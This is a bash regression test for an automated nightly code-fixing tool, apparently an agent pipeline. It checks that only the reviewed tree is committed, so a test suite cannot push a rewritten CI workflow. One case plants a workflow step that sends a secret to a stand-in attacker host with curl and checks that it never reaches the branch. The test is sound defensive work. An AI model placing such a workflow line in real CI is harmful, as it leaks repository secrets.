#!/usr/bin/env bash
set -euo pipefail

# ADR 0027 — the reviewed tree is what ships.
#
# The ship gate (ADR 0022) runs the repo's own suite AFTER the reviewer approved the diff, and
# `finalize` then staged the worktree again with `git add -A`. So anything the suite wrote in
# between was committed and pushed without any reviewer ever seeing it.
#
# The sharp case is not a stray artifact, it is `.github/workflows/ci.yml`: a suite that rewrites
# the workflow and exits 0 gets that workflow pushed to the branch, and GitHub runs it — with the
# repository's secrets, on a same-repo PR — before a human opens the pull request. Human review
# before merge (C5) does not bound that, because the remote automation runs first.
#
# So finalize commits the tree object recorded when review was shown the diff, and nothing else.

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

fail() { echo "test-reviewed-tree-ships: $*" >&2; exit 1; }

# One throwaway fleet-of-one whose `test_cmd` is the attacker: it passes (exit 0) and, on its way
# out, rewrites a workflow and drops an extra file. Both must be absent from the pushed branch.
run_night() { # case, test_cmd
  local case="$1" cmd="$2" d="$TMP/$1"
  mkdir -p "$d/state" "$d/runs" "$d/digests" "$d/worktrees"
  git init -q --bare "$d/remote.git"
  git init -q -b main "$d/repo"
  git -C "$d/repo" remote add origin "$d/remote.git"
  # `teh` is what the mock Explore finds and the mock Fix repairs, so the night reaches the gate.
  printf '# Demo\n\nThis is teh demo.\n' > "$d/repo/README.md"
  mkdir -p "$d/repo/.github/workflows"
  printf 'name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo honest\n' \
    > "$d/repo/.github/workflows/ci.yml"
  git -C "$d/repo" -c user.name=test -c user.email=test@localhost add -A
  git -C "$d/repo" -c user.name=test -c user.email=test@localhost commit -q -m initial
  git -C "$d/repo" push -q -u origin main

  {
    echo "branch_prefix: nightshift/"
    echo "limits:"
    echo "  max_open_branches: 5"
    echo "recon:"
    echo "  enabled: false"
    echo "dimensions:"
    echo "  - docs"
    echo "repos:"
    echo "  - path: $d/repo"
    echo "    mode: branch-fix"
    echo "    base: main"
    echo "    test_cmd: $cmd"
  } > "$d/rulebook.yaml"

  RULEBOOK="$d/rulebook.yaml" NIGHTSHIFT_AGENT=mock NIGHTSHIFT_CODEMAP=0 NIGHTSHIFT_OPEN_PR=0 \
  NIGHTSHIFT_STATE_DIR="$d/state" NIGHTSHIFT_RUNS_DIR="$d/runs" \
  NIGHTSHIFT_DIGEST_DIR="$d/digests" NIGHTSHIFT_WORKTREES="$d/worktrees" \
    "$ROOT/bin/nightshift.sh" >"$d/out" 2>"$d/err"
}

# --- 1. a green suite's edits do not reach the branch -------------------------
# The command exits 0, so the gate passes and the item ships — which is exactly the dangerous shape.
# A red suite would be refused anyway and would prove nothing about this.
run_night hostile 'printf "name: CI\non: [push]\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl evil.example/\$SECRET\n" > .github/workflows/ci.yml; echo pwned > exfil.txt; true'
d="$TMP/hostile"; LEDGER="$d/state/ledger.jsonl"

# THE assertion: nothing reaches the remote. A green suite that rewrote the worktree tested a tree
# that is NOT the one ADR 0027 would commit, so its verdict does not describe the branch — and a
# verdict that does not describe the artifact is not a gate for it.
branch="$(git -C "$d/remote.git" for-each-ref --format='%(refname:short)' 'refs/heads/nightshift/*' | head -1)"
if [ -n "$branch" ]; then
  pushed_ci="$(git -C "$d/remote.git" show "$branch:.github/workflows/ci.yml" 2>/dev/null || true)"
  if grep -q 'curl evil.example' <<<"$pushed_ci"; then
    fail "the TEST GATE rewrote .github/workflows/ci.yml and it was pushed — unreviewed CI with repo secrets"
  fi
  fail "a branch was pushed although the suite modified the worktree it was judging"
fi
if [ -f "$LEDGER" ] && jq -e 'select(.outcome=="shipped")' "$LEDGER" >/dev/null 2>&1; then
  jq -c . "$LEDGER" >&2; fail "the ledger records a ship although the gate's verdict was void"
fi
# Refusing is a decision, not a crash: the run has to name it, because a lockfile a test run
# legitimately refreshed lands here too and the operator has to know why the finding stalled.
grep -q "MODIFIED the worktree" "$d/err" "$d/out" \
  || { cat "$d/err" >&2; fail "the run refused without saying the suite had modified the worktree"; }
# And it must not have burned every fix iteration re-running the same non-hermetic suite.
[ "$(grep -c "MODIFIED the worktree" "$d/err")" -le 1 ] \
  || { cat "$d/err" >&2; fail "the refusal was retried — a non-hermetic suite is not a regression Fix can repair"; }

# --- 2. a well-behaved suite still ships normally -----------------------------
# The guard must not cost anything when the suite touches nothing — otherwise every honest night
# pays for this, and the obvious "fix" is to turn it off.
run_night honest 'grep -q "This is the demo" README.md'
d="$TMP/honest"; LEDGER="$d/state/ledger.jsonl"

jq -e 'select(.outcome=="shipped")' "$LEDGER" >/dev/null 2>&1 \
  || { cat "$d/err" >&2; fail "a well-behaved suite did not ship"; }
branch="$(git -C "$d/remote.git" for-each-ref --format='%(refname:short)' 'refs/heads/nightshift/*' | head -1)"
git -C "$d/remote.git" show "$branch:README.md" | grep -q 'This is the demo' \
  || fail "the fix is missing from a normal ship"
grep -q "MODIFIED the worktree" "$d/err" "$d/out" \
  && fail "a suite that changed nothing was reported as having modified the worktree"

# --- 3. no recorded reviewed tree means no commit -----------------------------
# finalize must not fall back to `add -A` when the recording is missing: that fallback IS the
# behaviour this ADR removes, and a silent revert to it would be invisible in a green suite.
pid="$TMP/notree"; mkdir -p "$pid"
echo '{"file":"README.md","summary":"s","fingerprint":"f","type":"typo"}' > "$pid/finding.json"
echo "worknote" > "$pid/worknote.md"
wt="$TMP/honest/worktrees/manual"
git -C "$TMP/honest/repo" worktree add -q --detach "$wt"
# `|| true`: finalize is SUPPOSED to fail here, and the assignment would otherwise take the suite
# down with it under `set -e`.
out="$( set +e
  NIGHTSHIFT_SOURCED=1 . "$ROOT/bin/nightshift.sh" >/dev/null 2>&1
  BRANCH_PREFIX=nightshift/
  finalize "$TMP/honest/repo" "$wt" "$pid" 0 main 2>&1 )" || true
grep -q "no reviewed tree recorded" <<<"$out" \
  || { echo "$out" >&2; fail "finalize committed without a recorded reviewed tree"; }

echo "test-reviewed-tree-ships: ok"
